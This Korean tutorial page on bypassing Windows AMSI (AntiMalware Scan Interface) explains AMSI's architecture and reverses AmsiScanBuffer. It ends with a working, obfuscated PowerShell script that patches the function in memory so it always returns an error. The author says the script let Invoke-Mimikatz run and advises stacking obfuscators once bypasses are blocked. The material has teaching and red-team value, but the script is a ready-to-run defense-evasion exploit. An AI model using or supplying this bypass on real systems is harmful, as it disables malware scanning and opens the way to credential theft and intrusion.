# AMSI 우회

이 글의 AMSI와 관련된 기술적인 내용은 [@rastamouse](https://twitter.com/\_rastamouse)의 [https://github.com/rasta-mouse/AmsiScanBufferBypass](https://github.com/rasta-mouse/AmsiScanBufferBypass) ,[https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/), 그리고 [@maorkor](https://twitter.com/maorkor) 의 "[https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf](https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf)"  프리젠테이션을 기반으로 작성되었습니다. ﻿

### AMSI 란&#x20;

![](<../.gitbook/assets/image (14).png>)

AMSI 는 AntiMalware Scan Interface 로, AV/EDR 솔루션들이 다른 어플리케이션들을 상대로 스캔과 악성코드 탐지에 유용하도록 마이크로소프트사에서 만든 인터페이스다. AMSI에는 3가지 구성요소가 있다.&#x20;

1. Consumer (컨슈머) - AMSI를 "소비"하는 구성요소로, AV/EDR 솔루션들에게 특정 데이터 스캔을 요청할 수 있다.&#x20;
2. Amsi.dll - AMSI 함수들을 포함하고 있는 라이브러리. Consumer 프로세스에 로드된다. Consumer 프로세스들은 이 라이브러리 안의 함수를 이용해 Provider 에게  AMSI 요청을 보낸다.&#x20;
3. Provider (프로바이더) - AMSI를 "공급"하는 구성요소로, AV/EDR 솔루션들이다. AMSI를 통해 들어온 스캔 요청을 수행한 뒤, Consumer에게 결과를 반환한다.&#x20;

원래 AMSI의 컨슈머는 파워쉘 정도였지만, 버전이 올라감에 따라 파워쉘, 자바스크립트, VBA, WMI, .NET 까지 모두 AMSI를 사용한다. AMSI Provider 는 마이크로소프트, 크라우드 스트라이크, 비트 디펜더 등의 AV/EDR 솔루션 회사들로 미뤄져있다.&#x20;

AMSI는 `amsi.dll` 의 라이브러리 형태로 AMSI 컨슈머 프로세스에 로드된다. 컨슈머들은 이 로드된 라이브러리에 export 된 함수를 이용해 AMSI 요청을 프로바이더들에게 보내 데이터 내 악성코드를 탐지한다. &#x20;

### 레드팀/모의해커와 AMSI&#x20;

모의해킹을 하면 파워쉘과 .NET 기반의 툴링을 많이 사용하기 때문에 AMSI 를 상대해야 할 일이 많다. 이외에도 레드팀 업무를 진행하다보면 초기 침투시 VBScript, JScript 등의 스크립트 기반의 페이로드를 사용할 때가 있는데, 이때도 AMSI 를 상대해야한다. 사실상 PE 파일을 제외한 오펜시브 시큐리티에 사용될 수 있는 모든 파일 형태를 AMSI 가 방어하기 때문에 AMSI 우회는 필수적이다.

### AMSI 우회 - 3가지&#x20;

AMSI는 Consumer, Amsi.dll, Provider 세 가지 구성요소로 이뤄져있다. 이 세 가지 구성요소의 연결점들 중 하나만 끊어져도 AMSI는 제 역할을 못하게 된다. 연결점을 끊는 AMSI 우회는 총 3가지가 있다:&#x20;

1. Consumer Unhooking - 컨슈머가 AMSI를 사용하지 못하도록 Reflection을 통해 로드된 라이브러리 안의 함수를 바꿔버리거나 에러가 나도록 변경한다.&#x20;
2. AMSI.dll Memory Patching - 로드된 `Amsi.dll` 라이브러리 안의 AMSI 함수들의 메모리를 패치해 무조건 에러를 반환하게끔 한다. 이렇게 되면 컨슈머가 AMSI를 이용해도 Provider로 함수 요청이 되지 않고 그냥 에러만 반환된다.&#x20;
3. Provider Patching -  컨슈머 프로세스에 같이 로딩된 프로바이더 라이브러리의 1) `DllGetClassObject` 함수를 패치해 Amsi 시작 프로세스를 방해한다. 2) 혹은 프로바이더의 scan() 함수를 찾아 에러나 악성코드 없음을 반환하도록 패치한다. 이 방법은 [레퍼런스를 참고한다. ](https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf)

### 실습 - AMSI.dll Memory Patching&#x20;

아래는 해킹 작업소에 썼던 원글 - [https://cafe.naver.com/officialsegfault/487](https://cafe.naver.com/officialsegfault/487) 을 가져왔다.&#x20;

AMSI는 amsi.dll 의 형태로 각 프로세스마다 로드가 됩니다. 라이브러리이기 때문에 export 함수들을 가지고 있는데, 이는 MSDN에서 확인 가능합니다 (https://docs.microsoft.com/en-us/windows/win32/api/amsi/). 함수 중에서 AmsiScanBuffer 라는 함수가 있는데, 이 함수는 특정 버퍼를 스캔해 악성코드인지 아닌지를 확인해주는 함수입니다.

더 자세히 알아보기 위해 Ida Free로 amsi.dll 파일을 살펴봅니다.

![](https://lh6.googleusercontent.com/TiMT7ULDGGTCh6N2uz01qhR4Hiuezyd-sg\_3OGFy\_ZbQyWHYt0WXcziZOEzqHiUw5dq9twz3VpplauHmyT\_muaC95fqCTLsKZtrgQXdxKFbvqoxB8ugsm5bCVH1IuxBB8XphmhBq=s0)

AmsiScanBuffer 함수 시그니쳐

라이브러리 로드 후 AmsiScanBuffer 함수를 살펴보면 다음과 같은 함수 시그니쳐가 나옵니다:

```javascript
HRESULT AmsiScanBuffer(
	HAMSICONTEXT amsiContext,
	PVOID buffer,
	ULONG length,
	LPCWSTR contentName,
	HAMSISESSION amsiSession,
	AMSI_RESULT *result
);
```

![AmsiScanBuffer 시작지점](https://lh3.googleusercontent.com/geZlp5cjNo55L\_5ob\_Dzw2m0gAQziEheK2dCw9-3179efm6F\_klwZWyESMOiArqXQfke4\_YElT3QwA7JDPO\_PK51gz8QT-8xGgnE3MuF6tmjCJm7-xGMj1dZgAq9yzuI8iDUw4KX=s0)

함수의 시작지점을 분석하면 윈도우 x64 콜링 컨벤션(https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-160)에 맞춰 매개변수 6개를 레지스터와 스택에 저장하고 있는 것을 볼 수 있습니다. 첫 4개 매개변수는 r9, r8, rdx, rcx 에서 받아오고, 나머지 5번째 6번째 매개변수는 스택에서 \[rsp+88h+result, rsp+88+amsiSession] 에서 받아 rbp, r14 레지스터에 저장하고 있습니다.

즉, r15, edi, rsi, rbx, rbp, r14, 등에 매개변수들을 저장한 뒤, 이를 사용해 함수가 실행됩니다.

![매개변수 확인 - 1](https://lh3.googleusercontent.com/gTFW03rxiiFsPQzkhm8xQjGN21gFx09FtcwJXX-LkJh3\_GcDuTNBOYQGFDJ8h5JJPfdOEjMlvnFJyBIBkFD-lyFikEYTbTUTxqo4QCFslwVBTcYWXP-gNTxLnRYD0fpdQnYFglfd=s0)

![매개변수 확인 - 2](https://lh6.googleusercontent.com/K5uvFAvyO2RxKXUAET7iXcfdzuOjf75UFCvQvZ9pgo03W6WEfVdCfQWE4bWzNboJFnnf36ztgh6AAtwwp\_rDafZhHPhVVTR3wd460HZMNK7imu7WdXeP7tZClN1\_GTyfQh1Xez60=s0)



이 이후를 살펴보면 위 매개변수들이 저장되어 있던 레지스터들이 모두 test, cmp 과 jump if zero 과정을 거치고 있습니다. 어셈블리 공부를 하신 분들이라면 기억하시겠지만, 어셈블리에서 test <똑같은-레지스터> <똑같은-레지스터> 와 jump if zero 의 조합의 의미는 다음과 같습니다.

**" 해당 레지스터가 0일 경우 Zero Flag를 1로 세팅한다. Jump if Zero 에 따라 Zero Flag 가 1이라면 (해당 레지스터가 0이라면) 초록색 선을 따라 해당 주소로 점프하라. "**

즉, 특정 매개변수가 0일 경우 - 즉, 없을 경우 - **loc\_1800036B5** 로 점프합니다. 이 지점에서는 80070057h 값을 eax 에 집어넣은 뒤, 함수가 반환됩니다 (mov eax, 80070057h + ret) 함수가 반환될 때 리턴 값을 eax 에 저장하는 것은 필수는 아니지만 일반적이니 이해가 됩니다.

따라서 위 어셈블리 언어를 리버싱해 간단한 수도-코드로 바꿔보면 다음과 같이 됩니다.

```javascript
def amsiScanBuffer(p1, p2, p3, p4, p5, p6):
	if (p1 == null or p2 ==null ... or p6==null):
		debug("[-] Missing one or more parameters. Something is wrong!")
		return 80070057h
	else:
		< 매개변수가 모두 있을 시, 정상적인 amsiScanBuffer 실행! >
```

그렇다면 반환되는 80070057h 는 뭘까요?

구글링을 잠깐 해보면 (https://docs.microsoft.com/en-us/windows/win32/seccrypto/common-hresult-values) 윈도우의 HResult 값들 중 하나인 E\_INVALIDARG 가 나옵니다.

![](https://lh6.googleusercontent.com/vNIkt4tggEhFXLy4I-BvCuYrbQRqWqD6kL8Uxv7C0gW8hOtPoTfk6oEexYxilWiigGrYGsb-ZPsyDSel3HVQWDLHOR8kb6GHFweUYAfn\_tHKHjsRl3foj8FgemhnTys39NTgChJh=s0)

1개 이상의 인자가 잘못되었을 경우 반환되는 값입니다.

#### 메모리 패치

리버싱은 좋은데, 이걸로 뭘 할 수 있을까요?

Amsi.dll 라이브러리는 우리의 프로세스에 로드가 된 뒤, 우리가 실행하는 모든 메모리상의 코드를 AmsiScanBuffer 함수를 통해 검사합니다. 우리가 조종하는 프로세스에 로드된 라이브러리는 우리가 직접 메모리 패치를 통해 원하는 대로 바꿀 수 있습니다.

Amsi.dll 의 AmsiScanBuffer 함수의 가장 첫번째 어셈블리어를 패치해서, 그냥 무작정 80070057h 를 반환하게끔 하면 어떨까요? 함수가 실행하기도 전에, 그냥 냅다 80070057 를 반환하고 함수를 끝내버리는겁니다.

그렇게 되면 AmsiScanBuffer 는 우리의 파워쉘을 스캔하지도 못한채, 그냥 함수가 끝나버리게 되고, amsi 는 무슨 일이 일어났는지도 모르게 될겁니다.

함수가 냅다 80070057 를 반환하게끔 하려면 다음의 어셈블리 언어를 함수의 시작지점에 덮어씌우면 됩니다. - **0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3** -

`0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3` 는 다음과 같은 어셈블리언어로 해석됩니다.

```javascript
mov eax, 0x80070057
ret
```

위에서 봤던 어셈블리어와 똑같습니다. Eax에 80070057 값을 넣은 뒤, 바로 함수를 끝내버리는 ret 를 실행하는겁니다. 그렇게 되면 eax에 있던 80070057 값이 리턴됩니다. 이제 이 **0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3** 를 함수의 시작지점에 덮어씌워버리면 AmsiScanBuffer 함수를 우회할 수 있습니다.



\==========================================================



### 실습&#x20;

실제 공격은 c# 에서 winapi 를 이용해 AmsiScanBuffer 의 메모리주소를 구하고, 메모리 권한을 읽기 + 쓰기 + 실행하기로 바꿔 메모리가 쓰여질 수 있도록 한 뒤, 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 를 해당 주소에 덮어씌우면 됩니다.

```powershell
$thing = @"
// thing 
// using System.Collections.ArrayList;
using System; // thingssa
using System.Runtime.InteropServices;
public class payload {
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
}
"@
Add-Type $thing
[System.Collections.ArrayList]$Patch = 0xB8, 0x57, 0x90, 0x90, 0x00, 0x90, 0x07, 0x80, 0x90, 0xC3
$Patch.Remove(0x90)
$Patch.Remove(0x90)
$Patch.Remove(0x90)
$Patch.Remove(0x90)

[byte[]]$byteArrayFun = "","","","","",""
$byteArrayFun[0] = $Patch[0]
$byteArrayFun[1] = $Patch[1]
$byteArrayFun[2] = $Patch[2]
$byteArrayFun[3] = $Patch[3]
$byteArrayFun[4] = $Patch[4]
$byteArrayFun[5] = $Patch[5]

$why = "Am" +"s" + "iSc" + "a" + "nBu" + "ffer"
$hmm = "a" + "m" + "si" + ".dl" + "l"
$librarz = [payload]::LoadLibrary($hmm)
$dest = [payload]::GetProcAddress($librarz, $why)
$p = 0
[payload]::VirtualProtect($dest, [uint32]5, 0x40, [ref]$p)

[System.Runtime.InteropServices.Marshal]::Copy($byteArrayFun, 0, $dest, 6)
```

﻿`Add-Type` 을 이용해 winapi를 가져오고, 그것을 이용해 에러를 반환하는 어셈블리 코드를 `amsi.dll` 라이브러리의 `AmsiScanBuffer` 함수의 시작 지점에 덮어씌우는 코드다.&#x20;

이를 이용하면 Invoke-Mimikatz 가 실행된다! - 07/03/2022 기준 (아마 몇 주 뒤에 막힐 것이다).

![](https://lh3.googleusercontent.com/bILbTPz93YDzaCh7S9oGjLkNs2eZhey0RW7guyYAjF4mkoeZs-Mp3\_rDHZxosXhagOaGzCch0IsXop5nE2aC10yFOxNVO3exaovcJmF9SHyGMdbTAmdKlchwp5BINUAoRUYCFBqo=s0)

### 추가&#x20;

AMSI 우회 페이로드는 많이 있지만, 나오는 족족 막히기도 한다. 재밌는 점은 난독화 툴을 2\~3개를 이용해 중첩 난독화를 하면 다시 또 AMSI 우회가 된다. (...)&#x20;



### 레퍼런스&#x20;

{% embed url="https://github.com/rasta-mouse/AmsiScanBufferBypass" %}

{% embed url="https://rastamouse.me/memory-patching-amsi-bypass/" %}

{% embed url="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell" %}

{% embed url="https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf" %}

